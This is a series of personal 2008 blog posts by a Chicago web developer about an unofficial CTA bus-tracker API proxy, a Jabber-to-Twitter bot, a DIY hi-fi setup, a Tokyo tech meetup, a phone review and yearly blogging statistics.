XML/HTML:

&lt;p style=&quot;clear: both&quot;&gt;To make this official, I now have to tag 7 people to make a Seven Things list on their blog.&lt;/p&gt;
&lt;p style=&quot;clear: both&quot;&gt;Ready? These Seven People please report to the meme office and make a Seven Things entry on your blog:&lt;/p&gt;

&lt;ol style=&quot;clear: both&quot;&gt;
	&lt;li&gt;&lt;a href=&quot;http://dylanreed.com&quot;&gt;Dylan Reed&lt;/a&gt; - my brother - I like involving him in the blogosphere.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://morefishthanman.com/&quot;&gt;Scott Van Den Plas&lt;/a&gt; - crazy person - He has a great blog and I love including him in meme parties.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://blog.localkinegrinds.com/&quot;&gt;Ryan Kanno&lt;/a&gt; - hawaii nerd - Ryan is hilarious. Hopefully all seven things will be about a Ukulele.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://prestosamo.blogspot.com/&quot;&gt;Cole Pierce&lt;/a&gt; - art nerd - Cole is one of my favorite artists. I used to make him go to terrible iowan raves.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://lakshvivek.com/&quot;&gt;Lakshmi Nagarajan&lt;/a&gt; - friend and pro blogger - Lakshmi is an awesome &quot;mommy&quot; blogger who learned to drive a car in 2008. heh.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://anders.conbere.org/journal/&quot;&gt;Anders Conbere&lt;/a&gt; - xmpp nerd - Anders is awesome. I hope he picks this meme up.&lt;/li&gt;
	&lt;li&gt;&lt;a href=&quot;http://www.joevw.com/blog/&quot;&gt;Speedy Joe&lt;/a&gt; - awesome designer - Speedy just set up his blog. I wanted to give him some blogosphere love. ;)&lt;/li&gt;
&lt;/ol&gt;
&lt;p style=&quot;clear: both&quot;&gt;The rules of this ‘game’ for those that I have tagged:&lt;/p&gt;

&lt;ul style=&quot;clear: both&quot;&gt;
	&lt;li&gt;Link your original tagger(s), and list these rules on your blog.&lt;/li&gt;
	&lt;li&gt;Share seven facts about yourself in the post - some random, some weird.&lt;/li&gt;
	&lt;li&gt;Tag seven people at the end of your post by leaving their names and the links to their blogs.&lt;/li&gt;
	&lt;li&gt;Let them know they’ve been tagged by leaving a comment on their blogs and/or Twitter&lt;/li&gt;
&lt;/ul&gt;
&lt;p style=&quot;clear: both&quot;&gt;There yea have it. I continued the meme. I am not one to be a meme killer ;) This was fun. Thanks to Eli and Brian for making it happen!&lt;/p&gt;

                <p>2008 was a great year.</p>

<p>A lot of fun things happened. I started speaking more. I started using linux as my desktop. Obama won. I played with XMPP manically. I built some neat applications and Threadless continued to be awesome.</p>

<p>On my blog, the following entires got a decent amount of attention: <ul>
	<li><a href='http://www.nata2.org/2008/10/06/chicago-transit-api/'>Chicago Transit API</a> - Oct. 6th - Reverse engineered and built a proxy for the CTA Bustracker.</li>
	<li><a href='http://www.nata2.org/2008/08/30/mini-hi-fi-the-chase/'>Mini Hi Fi: The Chase</a> - Aug. 30th - Built a mini stereo. Audiophile addiction avoided!</li>
	<li><a href='http://www.nata2.org/2008/07/13/exclaim-a-replacement-jabber-bot/'>Excla.im - a replacement jabber bot</a> - Jul. 13th - Built a small jabber bot to update twitter.</li>
	<li><a href='http://www.nata2.org/2008/03/25/social-xmpp/'>Social XMPP</a> - Mar. 25th - Initiated a conversation with the venerable Peter St. Andre to start up the social xmpp list.</li>
	<li><a href='http://www.nata2.org/2008/03/02/olpc-chicago-jabber-server/'>OLPC Chicago Jabber Server</a> - Mar. 2nd - Built a jabber server for hosting various OLPC related community activities.</li>
	<li><a href='http://www.nata2.org/2008/03/02/awesome-hosting-options/'>Awesome Hosting Options</a> - Mar. 2nd - Outlined what I use for hosting. A rather popular post. A bit outdated. I need to update it.</li>
	<li><a href='http://www.nata2.org/2008/02/29/the-mosso-cloud-how-requests-are-not-a-good-metric/'>The Mosso Cloud: Requests are not a good metric</a> - Feb. 29th - I was unhappy with how mosso had set about charging us for usage. Mosso is still a good host and is still struggling with this issue.</li>
	<li><a href='http://www.nata2.org/2008/02/25/google-apps-auth-xmpp-and-radius-idea/'>Google Apps Auth: XMPP and Radius idea</a> - Feb. 25th - I wrote about how I wanted a radius endpoint for my google apps account. It would make a bunch of stuff easier for me. My solution was to hack a radius server to auth over our Google Apps talk/XMPP account.</li>
	<li><a href='http://www.nata2.org/2008/01/22/putting-the-blame-on-your-vendors-for-the-win/'>Putting the blame on your vendors for the win</a>. - Jan. 22nd - I was unhappy with how some internet peers had blamed their vendor when equipment failures resulted in downtime. I think that people should stand behind their decisions and if there is an error - they should take responsibilities. It is weak to blame a vendor.</li>
</ul> The theme seemed to be XMPP and Hosting - which, if you have hung out with me recently,  is rather close to what i like to talk about in real life ;). I think that I will continue this trend into 2009, but hopefully blog about it more.</p>

<p>I did notice that I ended up blogging less this year than almost any year before (2008: 30 entries, 2007: 84 entries, 2006: 154 entries, 2005: 166 entries, 2004: 275 entries, 2003: 290 entries, 2002: 266 entries, 2001: 103 entries, 2000: 27 entries). I have been blogging for about 8 years for a total of about 1395 entries - which means that this 1 year accounts for about ~2% of my blog entries. haha. I am guessing that 2% accounts for about 90% of my blog traffic. I am not a new years resolution type of guy, but I would like to blog more regularly. Hopefully get my percentage up a bit. maybe 100 posts. It isn&#8217;t THAT hard. ;)</p>

<p>To offset the lack of blogging, I twittered a lot. In fact, I updated twitter around 3251 times (this number is approximate because of the twitter api and paging). Of the 3251 tweets, 852 were replies. I replied to <a href='http://twitter.com/paulsmith'>paulsmith</a> the most with 25 replies. <a href='http://twitter.com/ryankanno'>ryankanno</a> was second with 20 replies. I said awesome around 249 times. I talked about sleep 71 times. I mentioned Hiromi 122 times. I said fuck about 46 times. I talked about work 238 times.  My fake new years resolution about twitter is to stop having twitter steal blog entries. I saw that written somewhere and I laughed at how often that happens. I think of a blog and instead just twitter about it. It kills the entry and doesn&#8217;t flesh out my thoughts as much. I think the best plan is to integrate and use both mediums to develop a post.</p>

<p>My flickr usage dropped significantly this year. Kind of a bummer because i LOVE taking pictures. Hiromi is currently telling me that we don&#8217;t take enough picture together.  It looks like i took only ~800 pictures in 2008. I blame this on the iPhone and how slow its camera is. In previous years i have used <a href='http://shozu.com'>shozu</a> and a 360 device. This let me upload picture directly after i took them and most often in the background. I need to take more pictures. I wish i had more insight into my flickr pictures. I need to build out my archive a bit more to keep track of everything like i did with twitter. It is quite handy.</p>

<p>Work was awesome in 2008. We had some large projects that launched a bit rougher than i would have liked, but they turned out awesome. <a href='http://typetees.com'>Typetees.com</a>, <a href='http://theselectseries.com'>theselectseries.com</a>, <a href='http://threadlesskids.com'>threadlesskids.com</a> and the new <a href='http://threadless.com'>threadless.com</a> are all awesome. The team that worked on them are all amazing. I couldn&#8217;t ask for a better team of technologists, production people, operations people and warehouse people to help make technology at Threadless be awesome.  I can&#8217;t wait to see what is in the pipeline for 2009.</p>

<p>Seriously - 2008 was a great year. I can&#8217;t wait to see what 2009 brings. I hope more fun, more blog entires, more tweets and more pictures.</p>

<p>I have been busy. Threadless just ended its <a href='http://www.threadless.com/news/400348/Tees_from_5_at_Threadless_Annual_Holiday_Sale'>annual holiday sale</a> (went out with a <a href='http://www.threadless.com/news/406990/And_the_final_gift_is_opened_to_reveal'>bang</a>). <a href='http://hiromiusagi.com'>Hiromi</a> and I have been busy getting read for our holiday party with my parents on christmas (today!) and i have been hacking on a bunch of stuff in my spare time. Hiromi made an amazing dinner and we ate it. ;) It was a great time. We missed <a href='http://dylanreed.com'>Dylan</a> and <a href='http://photodork.org/'>Sarah</a>, but we will hopefully see them soon.</p>

<p>This year has been great thus far and I will attempt to memorialize it in a year end post around the 1st. However, in the meantime I wanted to take a moment and say &#8221;<a href='http://www.threadless.com/product/509/HI'>HI</a>&#8221; and go ahead and wish everyone a <a href='http://en.wikipedia.org/wiki/Holiday_greetings'>Happy Holidays</a>. I hope everyone discovered their proper amount of <a href='http://en.wikipedia.org/wiki/Conspicuous_consumption'>conspicuous consumer</a>. I know that <a href='http://reedbooks.org/'>we</a> did.</p>

<p>Although, I certainly don&#8217;t update my blog quite as often as I would like (or my mom would like) - I do update my <a href='http://twitter.com/harper'>twitter status</a> quite often and post a <a href='http://flickr.com/photos/natatwo'>number of pictures to flickr</a>. I am hopefully going to start updating this blog a bit more, but in the meantime you are welcome to check out my <a href='http://harperreed.org/activity/'>interweb activity aggregation page</a> and the <a href='http://feeds.feedburner.com/HarperReedsActivityDigest'>associated RSS feed</a> (props to <a href='http://derek.broox.com'>broox</a> who showed me <a href='http://derek.broox.com/today'>his</a>, which I copied).</p>

                <p>I have recently been involved in talking to a local chicago entity about their unofficial API. It has been fun and deserves a blog entry of its own. However, this is not that blog entry - this blog entry is about mashups and the not so public APIs they often create.</p>

<p>In the past couple years i have constantly been tearing apart webapps. Either because I wearing my developer hat at work or because i am rocking on something at home. I have always been trying to figure out what goes on behind the scenes and wondering if i coudl use that to do something cool.</p>

<p>A couple weeks ago i decided to figure out what powered the CTA Bustracker Google Maps mash up and was able to expose the <a href='http://chicago.transitapi.com/'>"hidden" api that powered the mashup</a>. In a conversation I had with <a href='http://www.juggernautco.com/about.html'><span style='font-family: Georgia,Times New Roman,Times,serif; font-size: x-small;'>Dan x O'Neil</span></a> about the unofficial API I was able to expose - he asked a question about mashups and APIs. It led me to rant about how there is so much untapped APIs out on the internet currently powering mashups, and other rich internet appliances. These APIs are not documented, are unofficial and will of course change. But think of the data and functionality that could come from all these mashups and startups who are building an API for internal use but could release it and empower their users to build something neat.</p>

<p>If you have built an application recently that has endpoints that is returning JSON for js frontend work, or is integrating with google maps, or is exposing endpoints for fun - PLEASE, please document it a bit, throw an API link on your site and let some enterprising and bored nerds build something on the thing you made. Don&#8217;t try to imagine how someone would use your endpoints - but expect to be surprised.</p>

<p>I need to do this with threadless - we built it to be very easy to break down and integrate into other peoples sites (image urls, etc). But, there is a secret API that we should be releasing, documenting and letting people use. Stay tuned.</p>

                <a href='http://www.flickr.com/photos/natatwo/264290817/' title='The goddamn damon bus. seriously by nata2, on Flickr'><img class='alignright' src='http://farm1.static.flickr.com/87/264290817_f5ccf294d0_m.jpg' height='180' align='right' alt='The goddamn damon bus. seriously' width='240' /></a>
<p>The genesis for this API is some work I did awhile ago reverse engineering the <a href='http://ctabustracker.com/bustime/map/displaymap.jsp'>CTA Bus Tracker mashup</a>. I was able to expose the endpoints that powered their google maps mashup. In its original state - you can get some pretty awesome functionality and data. I am attempting to clean it up and make it more robust.</p>

<p>The native endpoints thus far are: <ul>
	<li><a href='http://chicago.transitapi.com/bustime/map/getRoutePoints.jsp?route=49'>getRoutePoints</a>: Returns latitude/longitude, stop IDs, and stop names for bus stops along a particular route.</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getPatternPoints.jsp?route=20&amp;pattern=959'>getPatternPoints</a>:</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getStopPredictions.jsp?stop=8207&amp;route=49'>getStopPredictions</a>: Gets stop predictions. Timing and whatnot.</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getBusPredictions.jsp?bus=6654'>getBusPredictions</a>: Returns arrival predictions for a particular bus.</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getBusesForRoute.jsp?route=49'>getBusesForRoute</a>: Gets buses for specific route</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getBusesForRouteAll.jsp'>getBusesForRouteAll</a>: Gets information about every bus in the system.</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/schedules.jsp?agency=1&amp;route=92'>Schedule</a>: Download the Schedule (pdf! w00t)</li>
	<li><a href='http://chicago.transitapi.com/bustime/map/getTimeAndTemp.jsp'>getTimeAndTemp</a>: Outputs the current time and temp</li>
</ul> I have created a proxy for the endpoints that will do some caching and hopefully alleviate any crazy load the CTA servers would have if this API becomes popular.</p>

<p>I also did some work to push the UPOC alerts from the CTA riders community into a usable form. That endpoint is the first of hopefully many that can be used to grab real time information about the CTA. You can access it at: <ul>
	<li><a href='http://chicago.transitapi.com/api/alerts/upoc/latest/'>Community Upoc alerts</a>: Outputs the last alert sent from the UPOC group</li>
</ul> Dan X O&#8217;Neil and myself hacked these alerts into the <a href='http://twitter.com/ctatweet'>CTA Tweet bot</a> that sends CTA updates via twitter. Pretty neat.</p>

<p>Moving forward with the API, I want to do a couple key things. The first is to return JSON instead of that terrible XML. The second is to create a couple endpoints that will help with finding the right bus at the right location. I am always looking for help with this stuff - so if you have any ideas - please let me know in the comments.</p>

<p>So far, there are not a whole lot of applications using this API. The only ones I have thus far are: <ul>
	<li><a href='http://commuting.in/chicago/about'>Commuting.in Chicago</a></li>
	<li><a href='http://txtful.com/template.html?templateId=1368034'>txtful bus alerts</a></li>
	<li><a href='http://businfo.chicagobus.org/'>ChicagoBus.org Bus Finder</a></li>
</ul> If you know of any others - let me know. I have a couple projects brewing myself that will hopefully add a shortcode, and a jabber bot for bus notifications and queries. Are there any things yall would like to see? I personally want a really solid native iphone app. It would be awesome to be able to have the iphone pinpoint your location and then tell you what the nearest buses are that are arriving soon. Also - replicating the bus tracker in an easier to use fashion would be excellent.</p>

<p>All of this API work wouldn&#8217;t have been possible without the help of <a href='http://detour1999.com'>Dylan Richard</a>, <a href='http://www.derivativeworks.com/'>Dan X O'Neil</a> and <a href='http://chicagobus.org'>Kevin Zolkiewicz</a>. The CTA has also been amazingly cool with all of this - I really like those guys.</p>

<p>It all started a couple years ago when the SI Tripath Amp emerged on the market. It was a little amp that was reviewed as being MUCH bigger than its cost or its physical size. It was about 40 bucks at target and reviewed the same as amps costing thousands more. Pretty sweet.</p>

<p>I purchased a couple of these and immediately blew at least 2 of them fucking around, recasing and generally attempting to make them sound better than they sound stock. After giving my final one away to a former coworker of Hiromi&#8217;s - I stopped paying attention to the various blogs and audio reviews of the T Amps.</p>

<p>Until about 1.5 months ago. heh.</p>

<p>I read an article about <a href='http://www.hackaday.com/2008/07/27/build-your-own-speakers/'>building speakers on hackaday</a>. It lead me to another article about building your own <a href='http://www.hackaday.com/2005/05/26/cat-5-speaker-cables/'>speaker hi-end cables</a>. Which lead me to an article about <a href='http://www.tnt-audio.com/clinica/t-amp_tweaks_e.html'>reboxing a SI T-Amp</a>. Full circle.</p>

<p>The T-Amp article lead me to start reading <a href='http://diyaudio.com/'>diyaudio.com</a> for about 2 weeks straight. It was madness. I stopped programming, stopped hacking stuff and just started building out a new HiFi system in my head.</p>

<p>I read a bunch of reviews about amps, speakers, and all sorts of random topics - until i found this awesome <a href='http://6moons.com/audioreviews/trends/ta10.html'>6moons review</a> of the <a href='http://www.trendsaudio.com/EN/Product/TA-10_desc.htm'>Trends Audio TA-10.1</a>. The thing that was interesting about this review is that the <a href='http://6moons.com/audioreviews/trends/ta10_3.html'>3rd page</a> of the review mentioned some Klipsch speakers that i happen to own and have in my living room. The review mentioned how awesome the TA 10.1 was when matched with the Klipsch speakers, especially in a <a href='http://www.canuckaudiomart.com/forum/viewtopic.php?t=7335'>horizontal bi-amping</a> configuration.</p>

<p>So I went ahead and picked up two of them from <a href='http://www.audio-magus.com/'>Audio Magus</a> to bi-amp my klipsch monsters. I also picked up a <a href='http://www.phonopreamps.com/tc754pp.html'>CHEAP preamp</a> from <a href='http://www.phonopreamps.com/'>phonopreamps.com</a>. In total i spent about $325 and picked up 2 amps and 1 preamp.</p>

<p>After they arrived, i was able to hook everything up and after a bit of burn in really hear how awesome it actually is. I am very happy with the results. I am not going to talk about soundstage or anything like that - just that it sounds awesome.</p>

<p>Since I am bi-amping my speakers - I went ahead and set both amps as poweramps (by a jumper inside the amp) and am using the preamp as the volume control. This works very well. My only gripe is that there is no remote, but that is a future addition.</p>

<p>For audio sources, i have an airport express, my turntable and a poor CD player.</p>

<p>The future of this system is exciting.</p>

<p>I am planning on getting a solid preamp. Probably a <a href='http://www.dared.gr/display.php?lang=EN&amp;model=SL-2000A'>Dared SL 2000A</a>. It seems that adding a tube preamp to my &#8220;digital&#8221; amp setup could offer some warmth to the system. It also has a remote for volume control. The only downside is that it only has 2 channels for input - which means that I will have to figure out one source to get rid of (turntable most likely).</p>

<p>The next thing I would like to add is a couple DACs to do the D/A conversion for my Airport Express and my CD transport. I am looking at the <a href='http://www.audio-magus.com/Super_Pro_DAC707SE_USB_p/dac707usb.htm'>Super Pro DAC707SE</a>. It is cheap, well reviewed and has USB support if I choose to add the DAC to one of my computers as a source. Having a DAC should make my Airport Express experience better when listening to lossless audio files. It will also make the shitty CD player sound a lot better. Ultimately, I would like to get a better cd player - which leads me to my next plan.</p>

<p>The CD transport is world is pretty nuts. It seems that every single transport available is in the thousands, and that there isn&#8217;t any really a DIY CD transport option that is accessible. There is one compelling option for DIY - the Shigaclone. It is a direct clone of the <a href='http://www.sakurasystems.com/products/shigacd.html'>Shigaraki Transport</a>, however the insides are from a JVC boombox (<span class='nf'><a href='http://www.amazon.com/JVC-RC-EZ31-Portable-Boombox-Cassette/dp/B000FD2AG4'>JVC RC-EZ31</a>)</span>. The <a href='http://www.diyaudio.com/forums/showthread.php?threadid=120229'>details are at diyaudio</a>. Unlike the other clones out there, the Shigaclone seems to be VERY hands on and just a bit past my skill level. I am waiting for a dedicated howto that explains all the various parts of the shigaclone and how I can make one without reading 1800 forum posts. In the meantime, i will have to find an alternative.</p>

<p>The alternative I have thus far is a 1994 NEC Multispin CDR-401G external CD-ROM. It has play/pause/forward/back buttons and has a digital coax out. It apparently sounds terrible, however once it is hooked to a DAC, it works wonderfully. It is VERY hard to find.</p>

<p>So for a CD transport, unless i want to spend a million bucks, I have two choices. Build a clone or buy a vintage CDROM.</p>

<p>I decided that the part of this i liked the best is the chase. I am very happy that I have a good sound system, but I am MORE excited about attempting to find the best system for cheap. Its a GREAT game.</p>

<p>I just need to make sure that i don&#8217;t fall for the tricks. I don&#8217;t want to spend ANY money on cables, nor money on speaker wire. <a href='http://www.engadget.com/2008/03/03/audiophiles-cant-tell-the-difference-between-monster-cable-and/4'>Metal is metal.</a></p>

                <p>Apparently for the last month or two, I totally forgot that i have a blog. Instead of blogging, i have been hanging out with Hiromi, using twitter,traveling, programming and building things. I didn&#8217;t have time to include blogging into that mix.</p>

<p>I have a theory, that when my twitter usage goes up, my blogging goes down (I am not <a href='http://www.problogger.net/archives/2008/07/12/does-twitter-distract-from-or-inspire-your-blogging/'>alone in this</a>). I am a bit annoyed by this. My twitter posts don&#8217;t have as much reach as my blog posts. My interaction with people on twitter is much higher than on my blog. I am so conflicted. haha. Luckily, i think i can do both without sacraficing (much) one or the other.I think i will have to just make my posting smaller and more frequent (like a tumble log - but bigger) and make sure that i don&#8217;t spend myself entirely on twitter.</p>

                <p>A couple weeks ago, I was in japan for some family events. It was a great trip. Hanging out with Hiromi&#8217;s family and friends was awesome. Since we were going to be spending some free time in Tokyo, i decided to reach out to the Tokyo tech community and meet some people.  I emailed my friend, Kristin, who had <a href='http://kristenicole2.wordpress.com/2008/05/28/day-2-in-tokyo-still-afraid-of-heights/'>just been to Japan</a> and asked her to hook me up with some cool cats in the tech scene.</p>

<p>She obliged and I was able to meet with an awesome group of people for a barcamp like event, and then hang out with another awesome guy who should be the tech tour guide of tokyo. I sadly missed some people from ibm, who were out of town on business - but there is always next time.</p>

<p>The <a href='http://akimoto.jp/blog/2008/06/21/aa-camp3%E6%97%A5%E9%80%A3%E7%B6%9A%E9%96%8B%E5%82%AC/'>barcamp like event</a> was called AA-Camp. It was hosted by <a href='http://akimoto.jp'>Akky AKIMOTO</a> who is from <a href='http://labs.cybozu.co.jp/en/'>Cybozu Labs</a>. Cybozu labs is a really neat incubator ran by the Cubozu company. It seems that the goal of the lab is to create the next big thing in japanese technology. They give a lot of autonomy to their engineers and really allow them to flouish. The idea of incubators always seem so fun. Akky had two other technologists at the event besides myself. We worked on our own projects, then we presented about ourselves. A</p>

<p>The presentations were pretty biographical, covering what we were up to, currently working on and our employers. The first to present was <a href='http://www.ganchiku.com/'>Shin Ohno</a>. He is a developer working with Akky to create a neat site for creating comparison tables called <a href='http://narabe.com/'>Narabe</a>. Shin has an awesome plan. He travels and does development from his travels. Since all he needs is internet and a laptop, he is well connected no matter where he finds himself.</p>

<p>The next presenter was Akky. He ran through his work, cybozu, cybozu labs and some of their applications they have created. They have launched a number of neat applications - my favorite is <a href='http://mylingual.net/'>mylingual</a> - which is a firefox script that translates site from one language to another. sweet stuff. The other applications were <a href='http://pathtraq.com/'>PathTraq</a> (alexa like site ranking) and <a href='http://japanize.31tools.com/'>Japanize</a> (translating sites into japanese), <a href='http://ja.doukaku.org/lang/'>doukaku</a> (coding challenges) and <a href='http://amachang.art-code.org/pr/'>S6</a> (a presentation framework). You can seem a summary of Akky&#8217;s presentation <a href='http://asiajin.com/blog/2008/05/16/tokyo2point0-event-cybozu-labs-and-phishing-web-20-security/'>here</a>. Its a bit different - but basically the same.</p>

<p>The next presenter was <a href='http://mellowtone.co.jp/'>ARAI Shunichi</a>. He was working in Ruby doing some neat things related to a startup in stealth mode. He showed us a Ruby framework he had written called <a href='http://code.google.com/p/egalite/'>Egalite</a> which is supposed to be even simpler than rails.</p>

<p>It was awesome to hang out with technologists who were doing neat things and interested in talking about their projects. I hope i get another chance to go to an AA-Camp.</p>

<p>A couple days later, I met up with Tsutomu Kodama. He works for <a href='http://japan-hopper.com'>Japan Hopper</a>, a site for backpackers and travelers in japan. it looks to be a google maps wiki mashup allow for people to annotate places and add cool traveler info. Neat. He took us to the small streets behind Omotesando and Harajuku. I was able to find some awesome shoes, check out amazing eyeglasses and eat at a really neat small resturant. I think that any technology person who is in Tokyo and wants to see neat things should attempt to contact Kodama. He is full of awesome places and good tips. He is also quite similar to myself (in a eeire way) and we got along quite well. A great afternoon.</p>

<p>Its exciting to have friends in Japan that are technologists. Now i know that next time i am there i will have the opportunity to network more and meet others.</p>

                <p>I use twitter quite a bit. I like to post to twitter in the most unobtrusive way possible. I don&#8217;t like to interupt my workflow to post a quick thought or update. When they used to have their Jabber bot running - it was easy for me to just type in my update and get on with my gmail session or work. I didn&#8217;t have to load a page that was often down, or use some other tool. I was bummed when the jabber bot went away. I needed it back to keep up with my use case.</p>

<p>I got tired of waiting, so i made <a href='http://excla.im'>Excla.im</a>. It is a simple <a href='http://appengine.google.com/'>App Engine</a> hosted application that allows a person to very simply update their twitter status from any jabber account. It is not very feature full, doesn&#8217;t update all the other sites and doesn&#8217;t do much else besides just interact with the twitter API. It is very simple.</p>

<p>The technology behind it is just as simple. The GAE app is written in python and uses the <a href='http://google-app-engine-django.googlecode.com/'>django helper</a>. It is super simple and is basically a storage container for account info. It was a breeze to develop and fun to work with.</p>

<p>The Jabber bot was a bit more complicated. I ended up using the <a href='http://code.google.com/p/sleekxmpp/'>sleekxmpp library</a> to do all the XMPP heavy lifting. It is an awesome library. Makes all the hard stuff easy. I then used <a href='http://hathawaymix.org/'>Shane Hathaway's</a> <a href='http://hathawaymix.org/Software/Sketches/daemon.py'>daemon.py</a> to help daemonize the bot (btw thanks to <a href='http://anders.conbere.org/'>Anders</a> for talking me through the dirtiness of daemonizing). To hook into twitter I used the <a href='http://code.google.com/p/python-twitter/'>python twitter</a> library. It is featureful and super easy to use. It also supports in newer versions (post <a href='http://code.google.com/p/python-twitter/source/browse/trunk/twitter.py?r=112'>r112</a>) setting the source.</p>

<p>I was then able to wrap this all up in a fancy little bot that on receiving a message, grabs encrypted credentials from the GAE app, sends the message to twitter&#8217;s api and then chills out. Pretty sweet. Currently all the heavy lifting is on the bot side, instead of on the webapp side - but i may change that.</p>

<p>At some point, I would like to be able to grab a users twitter friends updates and push them to their jabber ids. However - I have yet to figure out a nice and clean way to get the updates without having them seem batched. I have some ideas and a couple things fleshed out - but i don&#8217;t want to totally replicate twitter just to get my friends updates.</p>

<p>I am toying with putting the bot up on google code since it is pretty simple and could easily be hooked into almost any webapp. I think that the idea of a simple (simpler than sleekbot) webapp integrated jabber bot would have been helpful in writing this - and i imagine that people looking to do a similar thing may have use for my hacked together code.</p>

<p>A couple take aways from doing this project. First off - python is fun. Second - working with a designer makes things look a LOT better. <a href='http://www.aaronsalmon.com/'>Aaron Salmon</a> took some time to make excla.im look MUCH better than it did. Check out his stuff and hire him.</p>

<p>Then came the <a href='http://en.wikipedia.org/wiki/IPhone'>iPhone</a>. It basically broke my conception of how smart phones should work. The full browser, the full email client, and simple applications made me realize that i would rather have a good phone that does a lot of stuff well - than a good platform that does a lot of stuff mediocre. It took a minute for me to realize that (so much that I gave my first iPhone to Hiromi, thinking that I didn&#8217;t like it).</p>

<p>Awhile back, <a href='http://www.womworld.com/'>Nokia WOM</a> emailed me and asked if i wanted to test drive a <a href='http://en.wikipedia.org/wiki/N95'>N95 8gb</a> for free. I of course accepted the challenge. There was no catch, requirements, etc. They wanted me to blog about it and let people know what i thought - but they certainly didn&#8217;t require this. It also wasn&#8217;t mine forever, just a test drive. I was stoked. This is the device that dreams were made of. It was all that was good in the world. It had real GPS, ran symbian, had decent media, ngage, etc, etc, etc. It was basically the culmination of all i thought i needed in a mobile device.</p>

<p>I wondered how it would compare to the iphone i had been using for almost a year.</p>

<p>It didn&#8217;t. I used it for an hour and couldn&#8217;t deal with it. it was hard to use. hard to make calls. hard to take pictures. hard to listen to music. hard to figure out where I was with GPS (honestly, that was the clencher. All I wanted was to update a webpage with my location using GPS. I got it going by hacking my iphone easier than using the N95). It made me remember why I liked the iphone. It made me bummed that the &#8220;best&#8221; phone in the world kinda sucked.</p>

<p>So, I gave the phone to my buddy <a href='http://craigshimala.com'>Craig</a> at work. He loves it. It was a great upgrade to his POS dying Sony Ericsson. He planned to use it until the new iPhone comes out.</p>

<p>I guess Nokia is going to have to rethink how their phones work. I was their super fan. I read all the blogs, proselytized their phones, hung out with their engineers, and loved their products. However, I am unwilling to give up the experience that I have with the iPhone. The ease of use, the full browser, the big screen and the platform that isn&#8217;t insane.</p>

<p>I am excited to see where this innovation (or lack there of) takes us. I imagine that Nokia will bounce back, but certainly not any pre-iPhone devices. Stay tuned for sure.</p>

<p>I am really thankful for <a href='http://www.womworld.com/'>Nokia</a> giving me this experience. Even though it wasn&#8217;t the phone for me, it was fun to play with and think about why it wasn&#8217;t my thing. It is still a dope phone even if it isn&#8217;t beating the iPhone.</p>

<p>I am more happy that Hilary Clinton didn&#8217;t win. She was really hurting my insides me with all the negative campaigning. I did not like how attacky she got in the end. I hope that she is done being annoying.</p>

<p>Now is the time to start supporting the Barack Obama, and the democratic party to defeat John McCain in November. Electing McCain is basically saying that you love President Bush and really want to fuck up the United States. I am not a fan.</p>

<p>The best part of having Obama be the democratic nominee is that he invokes hope in people, not fear. I am tired of fear.</p>

<p>Go donate money now.</p>

<p>After melding all these things together - i decided it would be neat to have the info on my homepage. So, i created this &#8220;mashup&#8221; to keep track of everything. It was my first foray into being a consumer of oauth (myself, programatically) and i really like it. I am for sure going to use this for the threadless API when it launches (thanks friends!). Dopplr&#8217;s API is a pain in the ass (there is about 1 page of API documentation), but i finally figured it out.</p>

<p>With all of the sites melded together - i was able to get my current location (fireeagle), and my future and past travels (dopplr). The info for both of these sites is provided in part by dopplr and tripit. Tripit feeding dopplr which feeds fireeagle. I feed tripit with emails. It has been hungry lately.</p>

<p>Seeing all this info together on my home page made me think of <a href='http://labs.harahap.org/stalkilya.php'>my friends page</a> where he tracks exactly where he is at all times. its kinda freaky and pretty invasive. But i wanted to know if i could build it. And i figured that building the gps &#8220;puck&#8221; as Ilya calls it would be a good experience.</p>

<p>Since i have an iphone instead of a phone with true GPS, I used an <a href='http://ericasadun.com/?p=188'>app made by Erica Sadun</a> (an awesome apple hacker) that queries the wifi APs and cell towers that the iphone uses to handle its pseudo GPS. With this app I am able to grab my location and post it to a script i made to track everything. From the script I am able to handle posting to fireeagle or twitter or whatever. A lot of the <a href='http://soylentfoo.jnewland.com/' title='this is an awesome writeup btw'>writeups</a> of this sort of thing have the iphone handle the posting to fireeagle or twitter, however that doesn&#8217;t really make sense to me - since having less http calls on the actual device seems to be a better plan for battery dominance.</p>

                <p>Man. It has been a long time since I really felt like blogging. Blogging is weird sometimes. I finds myself being VERY busy and not having the time nor energy to blog thoroughly, so i end up forfeiting an entry, when i could have easily whipped up a couple paragraphs describing whats going on. I instead find myself concentrating on twitter or something else. Its pretty cool - but not as important as my blog.</p>

<p>Anyway.</p>

<p>The last couple months and the next couple months are all about travel. Its insane. It reminds me how much i love traveling, but how much I HATE flying. I used to love flying, but recently it has only been horrible experiences. I don&#8217;t know why it is so horrible, but for some reason - I have had NOTHING but bad experiences. It makes me not want to fly any longer. I need to work on just appearing.</p>

<p>After speaking at the U of A in Tucson, I went on to fly to San Antonio to hang out with Rackspace for a week. It was pretty awesome. We had <a href='http://hideyourarms.com/2008/03/21/threadless-went-down-so-you-get-a-coupon/'>some</a> <a href='http://www.stacksafe.com/blog/2008/04/02/case-studies-for-the-cost-of-downtime/'>problems</a> we needed to ferret out and Rackspace was very facilitative. I have always found it so much easier to work with people once you have met them and hung out. Then - the repertoire is much more than just the mysterious phone voice that tells you things. It was awesome to meet our team, flesh out our migrations and other various upcoming projects. San Antonio is a very strange place. I am not sure what i think of it.</p>

<p>After San Antonio, most of the Threadless engineering team flew to Santa Clara for the 2008 MySQL Conference. As always, the conference was great. I had a nice time and was able to see a lot of my friends and talk shit about technology and how to name hosting companies (It&#8217;s Mosso like MOSS. Not like mow). A couple of highlights from the conference were meeting and hanging out with <a href='http://romeda.org/'>Blaine Cook</a>; getting my <a href='http://flickr.com/photos/natatwo/2460459966/'>picture taken by Julian Cash</a>; and having dinner with various engineers from MySQL, Digg, Mosso and Rackspace. The conference (like all conferences i think) was best experienced through the people who were there, not the actual sessions (although there were some cool ones - memcached, IMVU, etc).</p>

